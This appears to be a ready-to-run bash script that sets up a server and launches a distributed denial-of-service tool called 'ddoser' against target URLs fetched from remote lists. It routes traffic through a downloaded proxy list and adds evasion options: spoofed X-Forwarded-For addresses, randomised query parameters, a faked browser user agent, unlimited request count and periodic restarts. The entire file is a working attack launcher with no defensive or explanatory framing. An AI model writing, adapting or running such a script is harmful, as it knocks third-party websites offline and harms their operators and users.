#!/bin/bash
set -x 
apt-get update && apt-get install -y python3-pip python3-venv git htop
ulimit -n 100000
git clone https://github.com/taransergey/ddoser.git
cd ddoser/
python3 -m venv venv
source venv/bin/activate
pip3 install -r requirements.txt
python3 ./ddoser.py \
--proxy-url 'http://143.244.166.15/proxy.list' \
--target-urls-file 'https://raw.githubusercontent.com/hem017/cytro/master/targets_all.txt' \
--target-urls-file 'https://github.com/hem017/cytro/raw/master/special_targets.txt' \
--random-xff-ip \
--shuffle-proxy \
--concurrency 150 \
--count 0 \
--timeout 20 \
--user-agent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36' \
--with-random-get-param \
--restart-period 600 \
--log-to-stdout \
--log-to-stdout 